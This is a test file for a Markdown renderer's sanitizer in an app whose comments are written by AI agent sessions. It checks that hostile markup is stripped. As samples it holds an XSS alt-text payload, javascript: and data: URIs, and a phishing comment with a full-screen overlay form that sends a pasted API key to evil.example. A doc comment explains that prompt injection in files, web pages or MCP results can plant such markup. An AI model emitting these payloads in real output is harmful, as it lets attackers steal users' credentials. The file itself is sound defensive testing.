// @vitest-environment jsdom
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vite-plus/test";
import { blobUrl, SESSION_ATTACHMENTS_REL_DIR, type NamedBlobLink } from "@volli/shared";

import { MarkdownAttachmentsProvider } from "@renderer/components/attachments/markdown-image";
import { ALLOWED_URI_REGEXP, Markdown } from "./markdown";

// jsdom rather than the renderer project's default Node environment, and the
// REAL dompurify rather than an identity mock: dompurify only binds `sanitize`
// when a window exists, and what the sanitizer removes is half of what these
// tests pin (VC-839). Every assertion here is about the markup that reaches
// `dangerouslySetInnerHTML`, after both halves of the pipeline.

const HASH = "a".repeat(64);

function link(originalName: string, blobHash = HASH): NamedBlobLink {
  return { linkId: `l-${originalName}`, blobHash, label: originalName, originalName };
}

function render(source: string, attachments: readonly NamedBlobLink[] = []): string {
  return renderToStaticMarkup(
    <MarkdownAttachmentsProvider attachments={attachments}>
      <Markdown source={source} />
    </MarkdownAttachmentsProvider>,
  );
}

describe("Markdown images (VC-273)", () => {
  it("renders a canonical volli-blob source", () => {
    const html = render(`![shipped pane](${blobUrl(HASH)})`);
    expect(html).toContain(`src="${blobUrl(HASH)}"`);
    expect(html).toContain('alt="shipped pane"');
  });

  it("resolves an attachment named by its materialized path", () => {
    // The path an agent is handed in the Ticket brief.
    const html = render(`![spec](${SESSION_ATTACHMENTS_REL_DIR}/spec.png)`, [link("spec.png")]);
    expect(html).toContain(`src="${blobUrl(HASH)}"`);
  });

  it("resolves a bare attachment name", () => {
    const html = render("![spec](spec.png)", [link("spec.png")]);
    expect(html).toContain(`src="${blobUrl(HASH)}"`);
  });

  it("says so, rather than emitting a broken img, when a source names nothing", () => {
    const html = render("![shipped pane](/Users/me/shipped.png)");
    // This is the exact markdown from the ticket's screenshot: an absolute
    // local path, which resolves against the app origin and 404s.
    expect(html).not.toContain("<img");
    expect(html).toContain("Image unavailable");
    expect(html).toContain("shipped pane");
  });

  it("declines a remote image and names that as the reason", () => {
    const html = render("![tracker](https://example.com/pixel.png)");
    expect(html).not.toContain("<img");
    expect(html).toContain("Remote image not loaded");
  });

  it("keeps the notice alone when the image had no alt text", () => {
    const html = render("![](https://example.com/pixel.png)");
    expect(html).toContain("Remote image not loaded");
    expect(html).not.toContain("—");
  });

  it("escapes alt text rather than letting it become markup", () => {
    const html = render("![<img src=x onerror=alert(1)>](https://e.com/a.png)");
    expect(html).not.toContain("onerror=alert(1)>");
    expect(html).toContain("&lt;img");
  });

  it("does not leak one surface's attachments into another", () => {
    // The renderer instance is per-render and closes over THIS surface's links.
    expect(render("![spec](spec.png)", [link("spec.png")])).toContain("<img");
    expect(render("![spec](spec.png)", [])).toContain("Image unavailable");
  });

  it("still renders ordinary markdown", () => {
    const html = render("# Title\n\n- one\n- two\n\nbody `code`");
    expect(html).toContain("<h1>Title</h1>");
    expect(html).toContain("<li>one</li>");
    expect(html).toContain("<code>code</code>");
  });

  it("renders GFM task list checkboxes", () => {
    const html = render("- [ ] todo\n- [x] done");
    expect(html).toContain('type="checkbox"');
    expect(html).toContain("checked");
  });
});

/**
 * The sanitizer's URI allowlist, which is upstream's with one scheme added.
 *
 * Worth its own tests because a `volli-blob:` src surviving sanitization is the
 * difference between an image on a Ticket and the broken box this ticket
 * started from — DOMPurify's DEFAULT regexp deletes the attribute outright —
 * and because a careless edit to a hand-copied upstream constant could widen it
 * far past the one scheme we meant to add.
 */
describe("ALLOWED_URI_REGEXP", () => {
  it("admits the app's own blob scheme, which the default regexp strips", () => {
    expect(ALLOWED_URI_REGEXP.test(blobUrl(HASH))).toBe(true);
  });

  it.each(["https://example.com/a.png", "mailto:a@b.c", "/relative/path.png", "#anchor"])(
    "still admits what upstream admits: %s",
    (uri: string) => {
      expect(ALLOWED_URI_REGEXP.test(uri)).toBe(true);
    },
  );

  it.each(["javascript:alert(1)", "data:text/html,<script>", "vbscript:msgbox"])(
    "still refuses what upstream refuses: %s",
    (uri: string) => {
      expect(ALLOWED_URI_REGEXP.test(uri)).toBe(false);
    },
  );
});

/**
 * What the sanitizer refuses (VC-839).
 *
 * A comment is written by any Session, so its body can be whatever a prompt
 * injection in a repository file, a web page or an MCP result put there.
 * DOMPurify's DEFAULT allowlists keep `<style>`, `style=`, `<form action>`,
 * `<button>` and `popover*`, and nothing about where a comment is drawn
 * contains them: one global sheet restyles the whole app, a fixed overlay draws
 * over it, and a GET form hands what a person typed to `will-navigate`, which
 * opens it in their browser.
 */
describe("Markdown sanitization (VC-839)", () => {
  // The body from the ticket, byte for byte: the one DOMPurify's defaults kept.
  const PHISHING_COMMENT = [
    "Done.",
    "",
    "<style>body{display:none}</style>",
    "",
    '<div style="position:fixed;inset:0;z-index:99999"><form action="https://evil.example/c"><input name="key" placeholder="Paste your API key"><button>Re-authenticate</button></form></div>',
  ].join("\n");

  it("strips the ticket's phishing comment down to its text", () => {
    const html = render(PHISHING_COMMENT);
    expect(html).not.toContain("<style");
    expect(html).not.toContain("display:none");
    expect(html).not.toContain("style=");
    expect(html).not.toContain("<form");
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("<input");
    expect(html).not.toContain("<button");
    // The words stay readable; only the machinery goes.
    expect(html).toContain("<p>Done.</p>");
    expect(html).toContain("Re-authenticate");
  });

  it("strips a comment body as an MCP install failure records it", () => {
    // `mcp.install` records a comment carrying the remote server's own error
    // text, so a server that answers with markup reaches this renderer with no
    // agent choosing the words.
    const html = render(
      "Installed MCP server `remote` failed: <style>*{display:none!important}</style>",
    );
    expect(html).not.toContain("<style");
    expect(html).not.toContain("display:none");
  });

  it.each([
    ["a textarea", "<textarea>secret</textarea>", "<textarea"],
    ["a select", "<select><option>a</option></select>", "<select"],
    ["an option", "<select><option>a</option></select>", "<option"],
    ["a dialog", "<dialog open>fake</dialog>", "<dialog"],
    ["a popover", '<div popover id="p">fake</div>', "popover"],
    ["a popover target", '<a popovertarget="p" popovertargetaction="show">x</a>', "popover"],
    ["a form method", '<div method="post">x</div>', "method"],
    ["an inline style", '<span style="color:red">x</span>', "style="],
    ["a text input", '<input name="key" placeholder="Paste your API key">', "<input"],
    ["an enabled checkbox", '<input type="checkbox">', "<input"],
  ])("removes %s", (_label: string, source: string, forbidden: string) => {
    expect(render(source)).not.toContain(forbidden);
  });

  it("keeps a task list's disabled checkboxes", () => {
    const html = render("- [ ] todo\n- [x] done");
    expect(html).toContain('<input disabled="" type="checkbox"> todo');
    expect(html).toContain('<input checked="" disabled="" type="checkbox"> done');
  });

  it("keeps ordinary GFM markup as marked wrote it", () => {
    const source = [
      "# Title",
      "",
      "A [link](https://example.com) and `code` and ~~gone~~ and **bold**.",
      "",
      "```ts",
      "const x = 1;",
      "```",
      "",
      "| a | b |",
      "|:-|-:|",
      "| 1 | 2 |",
      "",
      "> quoted",
    ].join("\n");
    const html = render(source);
    expect(html).toContain('<a href="https://example.com">link</a>');
    expect(html).toContain("<code>code</code>");
    expect(html).toContain("<del>gone</del>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain('<pre><code class="language-ts">const x = 1;');
    expect(html).toContain('<th align="left">a</th>');
    expect(html).toContain('<td align="right">2</td>');
    expect(html).toContain("<blockquote>");
  });

  it("keeps a volli-blob image through the real sanitizer", () => {
    expect(render(`![shipped pane](${blobUrl(HASH)})`)).toContain(`src="${blobUrl(HASH)}"`);
  });

  it("still drops a javascript: link", () => {
    expect(render("[x](javascript:alert(1))")).not.toContain("javascript:");
  });
});
